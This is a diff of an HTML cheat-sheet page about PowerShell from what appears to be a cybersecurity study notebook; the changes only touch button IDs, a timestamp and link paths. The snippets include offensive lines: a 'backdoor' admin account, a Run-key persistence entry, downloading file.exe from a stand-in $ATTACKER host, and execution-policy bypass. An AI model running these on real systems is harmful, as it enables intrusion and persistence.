@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:39 -->
+<!-- 2026-07-20 Mon 15:55 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>PowerShell</title>
@@ -891,20 +891,20 @@ administration uses 5.1 on Windows targets.
 </p>
 
 <p>
-Related: <a href="../org/20260206T060445--core-windows-processes__cybersecurity.html">Core Windows Processes</a>
-         <a href="../org/20260206T060740--windows-event-logs__concept_cybersecurity.html">Windows Event Logs</a>
-         <a href="../org/20260314T005758--windows-privilege-escalation__concept_cybersecurity.html">Windows Privilege Escalation</a>
-         <a href="../org/20260617T103542--evil-winrm__cybersecurity_tool.html">evil-winrm</a>
+Related: <a href="20260206T060445--core-windows-processes__cybersecurity.html">Core Windows Processes</a>
+         <a href="20260206T060740--windows-event-logs__concept_cybersecurity.html">Windows Event Logs</a>
+         <a href="20260314T005758--windows-privilege-escalation__concept_cybersecurity.html">Windows Privilege Escalation</a>
+         <a href="20260617T103542--evil-winrm__cybersecurity_tool.html">evil-winrm</a>
 </p>
 <div id="outline-container-orgd4316a5" class="outline-2">
 <h2 id="orgd4316a5">Core Concepts</h2>
 <div class="outline-text-2" id="text-orgd4316a5">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_82562c4bda0246548823db114e6f3851>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_a519b30965c84afab014fdf4f1134780>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_82562c4bda0246548823db114e6f3851=document.querySelector('button[name=btn_82562c4bda0246548823db114e6f3851]');
-copyBtnbtn_82562c4bda0246548823db114e6f3851.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Cmdlet format: Verb-Noun\nGet-Process\nStop-Service -Name \"wuauserv\"\n\n# Pipeline — pass objects between cmdlets\nGet-Process | Where-Object {$_.CPU -gt 100} | Select-Object Name, CPU\n\n# Get help\nGet-Help Get-Process\nGet-Help Get-Process -Examples\nGet-Command *service*         # find cmdlets matching a pattern\n\n# Aliases (common Linux equivalents)\nls   # Get-ChildItem\ncd   # Set-Location\ncat  # Get-Content\nps   # Get-Process\nkill # Stop-Process\n`);copyBtnbtn_82562c4bda0246548823db114e6f3851.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_82562c4bda0246548823db114e6f3851.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_a519b30965c84afab014fdf4f1134780=document.querySelector('button[name=btn_a519b30965c84afab014fdf4f1134780]');
+copyBtnbtn_a519b30965c84afab014fdf4f1134780.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Cmdlet format: Verb-Noun\nGet-Process\nStop-Service -Name \"wuauserv\"\n\n# Pipeline — pass objects between cmdlets\nGet-Process | Where-Object {$_.CPU -gt 100} | Select-Object Name, CPU\n\n# Get help\nGet-Help Get-Process\nGet-Help Get-Process -Examples\nGet-Command *service*         # find cmdlets matching a pattern\n\n# Aliases (common Linux equivalents)\nls   # Get-ChildItem\ncd   # Set-Location\ncat  # Get-Content\nps   # Get-Process\nkill # Stop-Process\n`);copyBtnbtn_a519b30965c84afab014fdf4f1134780.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a519b30965c84afab014fdf4f1134780.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -934,11 +934,11 @@ let res = copyTextToClipboard(`# Cmdlet format: Verb-Noun\nGet-Process\nStop-Ser
 <h2 id="org420a25c">Navigation and File System</h2>
 <div class="outline-text-2" id="text-org420a25c">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_401039cde3f94c91a131c1006f16215f>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_88fd46eec3e443ffa64858a04573fc10>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_401039cde3f94c91a131c1006f16215f=document.querySelector('button[name=btn_401039cde3f94c91a131c1006f16215f]');
-copyBtnbtn_401039cde3f94c91a131c1006f16215f.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Navigation\nSet-Location C:\\Users\nGet-Location                  # pwd equivalent\n\n# List directory\nGet-ChildItem\nGet-ChildItem -Recurse -Filter \"*.config\"\nGet-ChildItem -Hidden         # show hidden files\n\n# File operations\nCopy-Item file.txt C:\\Temp\\\nMove-Item file.txt C:\\Temp\\file_moved.txt\nRemove-Item file.txt\nRemove-Item C:\\Temp\\ -Recurse -Force\nNew-Item -ItemType Directory -Path C:\\Temp\\NewFolder\nNew-Item -ItemType File -Path C:\\Temp\\new.txt\n\n# Read / write files\nGet-Content C:\\file.txt\nSet-Content C:\\file.txt \"content\"\nAdd-Content C:\\file.txt \"append this\"\nGet-Content C:\\file.txt | Select-String \"password\"  # grep equivalent\n`);copyBtnbtn_401039cde3f94c91a131c1006f16215f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_401039cde3f94c91a131c1006f16215f.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_88fd46eec3e443ffa64858a04573fc10=document.querySelector('button[name=btn_88fd46eec3e443ffa64858a04573fc10]');
+copyBtnbtn_88fd46eec3e443ffa64858a04573fc10.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Navigation\nSet-Location C:\\Users\nGet-Location                  # pwd equivalent\n\n# List directory\nGet-ChildItem\nGet-ChildItem -Recurse -Filter \"*.config\"\nGet-ChildItem -Hidden         # show hidden files\n\n# File operations\nCopy-Item file.txt C:\\Temp\\\nMove-Item file.txt C:\\Temp\\file_moved.txt\nRemove-Item file.txt\nRemove-Item C:\\Temp\\ -Recurse -Force\nNew-Item -ItemType Directory -Path C:\\Temp\\NewFolder\nNew-Item -ItemType File -Path C:\\Temp\\new.txt\n\n# Read / write files\nGet-Content C:\\file.txt\nSet-Content C:\\file.txt \"content\"\nAdd-Content C:\\file.txt \"append this\"\nGet-Content C:\\file.txt | Select-String \"password\"  # grep equivalent\n`);copyBtnbtn_88fd46eec3e443ffa64858a04573fc10.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_88fd46eec3e443ffa64858a04573fc10.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -972,11 +972,11 @@ let res = copyTextToClipboard(`# Navigation\nSet-Location C:\\Users\nGet-Locatio
 <h2 id="org8c529c8">Process and Service Management</h2>
 <div class="outline-text-2" id="text-org8c529c8">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_d6591fc2ebac40bdb90facb8bf4aac61>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_ea707c72f16a4bb2a6ac59e9b28e9afd>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_d6591fc2ebac40bdb90facb8bf4aac61=document.querySelector('button[name=btn_d6591fc2ebac40bdb90facb8bf4aac61]');
-copyBtnbtn_d6591fc2ebac40bdb90facb8bf4aac61.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Processes\nGet-Process\nGet-Process -Name \"explorer\"\nStop-Process -Name \"notepad\" -Force\nStart-Process \"notepad.exe\"\nStart-Process cmd.exe -Verb RunAs   # run as admin\n\n# Services\nGet-Service\nGet-Service -Name \"wuauserv\"\nStart-Service -Name \"wuauserv\"\nStop-Service -Name \"wuauserv\"\nSet-Service -Name \"wuauserv\" -StartupType Disabled\n`);copyBtnbtn_d6591fc2ebac40bdb90facb8bf4aac61.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d6591fc2ebac40bdb90facb8bf4aac61.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_ea707c72f16a4bb2a6ac59e9b28e9afd=document.querySelector('button[name=btn_ea707c72f16a4bb2a6ac59e9b28e9afd]');
+copyBtnbtn_ea707c72f16a4bb2a6ac59e9b28e9afd.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Processes\nGet-Process\nGet-Process -Name \"explorer\"\nStop-Process -Name \"notepad\" -Force\nStart-Process \"notepad.exe\"\nStart-Process cmd.exe -Verb RunAs   # run as admin\n\n# Services\nGet-Service\nGet-Service -Name \"wuauserv\"\nStart-Service -Name \"wuauserv\"\nStop-Service -Name \"wuauserv\"\nSet-Service -Name \"wuauserv\" -StartupType Disabled\n`);copyBtnbtn_ea707c72f16a4bb2a6ac59e9b28e9afd.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ea707c72f16a4bb2a6ac59e9b28e9afd.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1001,11 +1001,11 @@ let res = copyTextToClipboard(`# Processes\nGet-Process\nGet-Process -Name \"exp
 <h2 id="org4be024d">Networking</h2>
 <div class="outline-text-2" id="text-org4be024d">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_edd4a4b6af8545a6a9f49b9b94cbc102>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_cd0f433964874f83b60380fba377aae7>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_edd4a4b6af8545a6a9f49b9b94cbc102=document.querySelector('button[name=btn_edd4a4b6af8545a6a9f49b9b94cbc102]');
-copyBtnbtn_edd4a4b6af8545a6a9f49b9b94cbc102.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Network configuration\nGet-NetIPAddress\nGet-NetAdapter\nTest-NetConnection google.com -Port 443    # test connectivity + port\n\n# DNS\nResolve-DnsName google.com\nResolve-DnsName -Type MX google.com\n\n# Active connections (netstat equivalent)\nGet-NetTCPConnection\nGet-NetTCPConnection -State Established\nGet-NetTCPConnection -LocalPort 443\n\n# Firewall\nGet-NetFirewallRule | Where-Object {$_.Enabled -eq \"True\"}\nNew-NetFirewallRule -DisplayName \"Allow 8080\" -Direction Inbound -Port 8080 -Protocol TCP -Action Allow\n`);copyBtnbtn_edd4a4b6af8545a6a9f49b9b94cbc102.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_edd4a4b6af8545a6a9f49b9b94cbc102.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_cd0f433964874f83b60380fba377aae7=document.querySelector('button[name=btn_cd0f433964874f83b60380fba377aae7]');
+copyBtnbtn_cd0f433964874f83b60380fba377aae7.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Network configuration\nGet-NetIPAddress\nGet-NetAdapter\nTest-NetConnection google.com -Port 443    # test connectivity + port\n\n# DNS\nResolve-DnsName google.com\nResolve-DnsName -Type MX google.com\n\n# Active connections (netstat equivalent)\nGet-NetTCPConnection\nGet-NetTCPConnection -State Established\nGet-NetTCPConnection -LocalPort 443\n\n# Firewall\nGet-NetFirewallRule | Where-Object {$_.Enabled -eq \"True\"}\nNew-NetFirewallRule -DisplayName \"Allow 8080\" -Direction Inbound -Port 8080 -Protocol TCP -Action Allow\n`);copyBtnbtn_cd0f433964874f83b60380fba377aae7.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_cd0f433964874f83b60380fba377aae7.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1034,11 +1034,11 @@ let res = copyTextToClipboard(`# Network configuration\nGet-NetIPAddress\nGet-Ne
 <h2 id="org74c55c8">Remote Management</h2>
 <div class="outline-text-2" id="text-org74c55c8">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_4565df62b57c482382f2e78a890b77fd>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_ce43d29b16fc4b878891fe13934e1061>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_4565df62b57c482382f2e78a890b77fd=document.querySelector('button[name=btn_4565df62b57c482382f2e78a890b77fd]');
-copyBtnbtn_4565df62b57c482382f2e78a890b77fd.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# WinRM must be enabled on target: Enable-PSRemoting\n# Run commands on remote machine\nInvoke-Command -ComputerName $TARGET -ScriptBlock { Get-Process }\n\n# Interactive remote session\nEnter-PSSession -ComputerName $TARGET\nEnter-PSSession -ComputerName $TARGET -Credential (Get-Credential)\nExit-PSSession\n\n# Pass credentials without prompt\n$cred = New-Object System.Management.Automation.PSCredential(\"user\", (ConvertTo-SecureString \"pass\" -AsPlainText -Force))\nEnter-PSSession -ComputerName $TARGET -Credential $cred\n`);copyBtnbtn_4565df62b57c482382f2e78a890b77fd.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_4565df62b57c482382f2e78a890b77fd.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_ce43d29b16fc4b878891fe13934e1061=document.querySelector('button[name=btn_ce43d29b16fc4b878891fe13934e1061]');
+copyBtnbtn_ce43d29b16fc4b878891fe13934e1061.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# WinRM must be enabled on target: Enable-PSRemoting\n# Run commands on remote machine\nInvoke-Command -ComputerName $TARGET -ScriptBlock { Get-Process }\n\n# Interactive remote session\nEnter-PSSession -ComputerName $TARGET\nEnter-PSSession -ComputerName $TARGET -Credential (Get-Credential)\nExit-PSSession\n\n# Pass credentials without prompt\n$cred = New-Object System.Management.Automation.PSCredential(\"user\", (ConvertTo-SecureString \"pass\" -AsPlainText -Force))\nEnter-PSSession -ComputerName $TARGET -Credential $cred\n`);copyBtnbtn_ce43d29b16fc4b878891fe13934e1061.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ce43d29b16fc4b878891fe13934e1061.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1062,11 +1062,11 @@ let res = copyTextToClipboard(`# WinRM must be enabled on target: Enable-PSRemot
 <h2 id="org6d4f1e6">User and Group Management</h2>
 <div class="outline-text-2" id="text-org6d4f1e6">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_c137d1d73340481490e5fe9c9e91362f>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_394b9435882a4004b0f64c0b0ca0861f>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_c137d1d73340481490e5fe9c9e91362f=document.querySelector('button[name=btn_c137d1d73340481490e5fe9c9e91362f]');
-copyBtnbtn_c137d1d73340481490e5fe9c9e91362f.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Local users\nGet-LocalUser\nNew-LocalUser -Name \"backdoor\" -Password (ConvertTo-SecureString \"Pass123!\" -AsPlainText -Force)\nAdd-LocalGroupMember -Group \"Administrators\" -Member \"backdoor\"\nRemove-LocalUser -Name \"backdoor\"\n\n# Domain (Active Directory module)\nGet-ADUser -Filter * | Select-Object Name, SamAccountName\nGet-ADGroupMember -Identity \"Domain Admins\"\nGet-ADComputer -Filter *\n`);copyBtnbtn_c137d1d73340481490e5fe9c9e91362f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_c137d1d73340481490e5fe9c9e91362f.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_394b9435882a4004b0f64c0b0ca0861f=document.querySelector('button[name=btn_394b9435882a4004b0f64c0b0ca0861f]');
+copyBtnbtn_394b9435882a4004b0f64c0b0ca0861f.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Local users\nGet-LocalUser\nNew-LocalUser -Name \"backdoor\" -Password (ConvertTo-SecureString \"Pass123!\" -AsPlainText -Force)\nAdd-LocalGroupMember -Group \"Administrators\" -Member \"backdoor\"\nRemove-LocalUser -Name \"backdoor\"\n\n# Domain (Active Directory module)\nGet-ADUser -Filter * | Select-Object Name, SamAccountName\nGet-ADGroupMember -Identity \"Domain Admins\"\nGet-ADComputer -Filter *\n`);copyBtnbtn_394b9435882a4004b0f64c0b0ca0861f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_394b9435882a4004b0f64c0b0ca0861f.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1088,11 +1088,11 @@ let res = copyTextToClipboard(`# Local users\nGet-LocalUser\nNew-LocalUser -Name
 <h2 id="orgea032a8">Registry</h2>
 <div class="outline-text-2" id="text-orgea032a8">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_50dd77f53df243198a2983df91bed455>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_2579680308c74bb1a3f7b777cb8138b9>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_50dd77f53df243198a2983df91bed455=document.querySelector('button[name=btn_50dd77f53df243198a2983df91bed455]');
-copyBtnbtn_50dd77f53df243198a2983df91bed455.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Navigate registry like a filesystem\nSet-Location HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nGet-ChildItem HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n# Read a value\nGet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n\n# Write a value (persistence)\nSet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" \`\n  -Name \"Updater\" -Value \"C:\\Temp\\payload.exe\"\n\n# Delete a value\nRemove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" \`\n  -Name \"Updater\"\n`);copyBtnbtn_50dd77f53df243198a2983df91bed455.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_50dd77f53df243198a2983df91bed455.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_2579680308c74bb1a3f7b777cb8138b9=document.querySelector('button[name=btn_2579680308c74bb1a3f7b777cb8138b9]');
+copyBtnbtn_2579680308c74bb1a3f7b777cb8138b9.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Navigate registry like a filesystem\nSet-Location HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nGet-ChildItem HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n# Read a value\nGet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n\n# Write a value (persistence)\nSet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" \`\n  -Name \"Updater\" -Value \"C:\\Temp\\payload.exe\"\n\n# Delete a value\nRemove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" \`\n  -Name \"Updater\"\n`);copyBtnbtn_2579680308c74bb1a3f7b777cb8138b9.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2579680308c74bb1a3f7b777cb8138b9.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1118,11 +1118,11 @@ let res = copyTextToClipboard(`# Navigate registry like a filesystem\nSet-Locati
 <h2 id="org829a4bf">Useful One-Liners</h2>
 <div class="outline-text-2" id="text-org829a4bf">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_b0e9cd8d78044046aaead996e749571f>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_89ad400dba82467e9403bf1e8a1e4379>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_b0e9cd8d78044046aaead996e749571f=document.querySelector('button[name=btn_b0e9cd8d78044046aaead996e749571f]');
-copyBtnbtn_b0e9cd8d78044046aaead996e749571f.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Find files containing a string (recursive)\nGet-ChildItem -Recurse | Select-String \"password\" | Select-Object Path, Line\n\n# Download a file\nInvoke-WebRequest -Uri \"http://$ATTACKER/file.exe\" -OutFile \"C:\\Temp\\file.exe\"\n(New-Object Net.WebClient).DownloadFile(\"http://$ATTACKER/file.exe\",\"C:\\Temp\\file.exe\")\n\n# Base64 encode/decode (useful for payload delivery)\n[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"whoami\"))\n[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\"dwBoAG8AYQBtAGkA\"))\n\n# Execute base64-encoded command (common in offensive tooling)\npowershell -EncodedCommand <base64>\n\n# Check execution policy\nGet-ExecutionPolicy\nSet-ExecutionPolicy Bypass -Scope Process -Force   # bypass for current session\n\n# Bypass execution policy without changing it\npowershell -ExecutionPolicy Bypass -File script.ps1\n\n# Get system info\nGet-ComputerInfo\n[System.Environment]::OSVersion\n`);copyBtnbtn_b0e9cd8d78044046aaead996e749571f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b0e9cd8d78044046aaead996e749571f.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_89ad400dba82467e9403bf1e8a1e4379=document.querySelector('button[name=btn_89ad400dba82467e9403bf1e8a1e4379]');
+copyBtnbtn_89ad400dba82467e9403bf1e8a1e4379.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Find files containing a string (recursive)\nGet-ChildItem -Recurse | Select-String \"password\" | Select-Object Path, Line\n\n# Download a file\nInvoke-WebRequest -Uri \"http://$ATTACKER/file.exe\" -OutFile \"C:\\Temp\\file.exe\"\n(New-Object Net.WebClient).DownloadFile(\"http://$ATTACKER/file.exe\",\"C:\\Temp\\file.exe\")\n\n# Base64 encode/decode (useful for payload delivery)\n[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"whoami\"))\n[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\"dwBoAG8AYQBtAGkA\"))\n\n# Execute base64-encoded command (common in offensive tooling)\npowershell -EncodedCommand <base64>\n\n# Check execution policy\nGet-ExecutionPolicy\nSet-ExecutionPolicy Bypass -Scope Process -Force   # bypass for current session\n\n# Bypass execution policy without changing it\npowershell -ExecutionPolicy Bypass -File script.ps1\n\n# Get system info\nGet-ComputerInfo\n[System.Environment]::OSVersion\n`);copyBtnbtn_89ad400dba82467e9403bf1e8a1e4379.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_89ad400dba82467e9403bf1e8a1e4379.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1158,11 +1158,11 @@ let res = copyTextToClipboard(`# Find files containing a string (recursive)\nGet
 <h2 id="orga545f1e">Event Log Queries</h2>
 <div class="outline-text-2" id="text-orga545f1e">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_95f14c23e9734892ac8888e2cdd44380>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_7c64ffac3abd4983b74a97f15a1a4f80>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_95f14c23e9734892ac8888e2cdd44380=document.querySelector('button[name=btn_95f14c23e9734892ac8888e2cdd44380]');
-copyBtnbtn_95f14c23e9734892ac8888e2cdd44380.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Query event logs\nGet-EventLog -LogName Security -Newest 50\nGet-EventLog -LogName Security -InstanceId 4624   # successful logons\nGet-WinEvent -LogName \"Microsoft-Windows-PowerShell/Operational\" -MaxEvents 100\n\n# Filter by time\nGet-EventLog -LogName System -After (Get-Date).AddHours(-24)\n`);copyBtnbtn_95f14c23e9734892ac8888e2cdd44380.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_95f14c23e9734892ac8888e2cdd44380.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_7c64ffac3abd4983b74a97f15a1a4f80=document.querySelector('button[name=btn_7c64ffac3abd4983b74a97f15a1a4f80]');
+copyBtnbtn_7c64ffac3abd4983b74a97f15a1a4f80.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Query event logs\nGet-EventLog -LogName Security -Newest 50\nGet-EventLog -LogName Security -InstanceId 4624   # successful logons\nGet-WinEvent -LogName \"Microsoft-Windows-PowerShell/Operational\" -MaxEvents 100\n\n# Filter by time\nGet-EventLog -LogName System -After (Get-Date).AddHours(-24)\n`);copyBtnbtn_7c64ffac3abd4983b74a97f15a1a4f80.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7c64ffac3abd4983b74a97f15a1a4f80.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1177,7 +1177,7 @@ let res = copyTextToClipboard(`# Query event logs\nGet-EventLog -LogName Securit
 </div></div>
 
 <p>
-See <a href="../org/20260206T060740--windows-event-logs__concept_cybersecurity.html">Windows Event Logs</a> for Event ID reference.
+See <a href="20260206T060740--windows-event-logs__concept_cybersecurity.html">Windows Event Logs</a> for Event ID reference.
 </p>
 </div>
 </div>
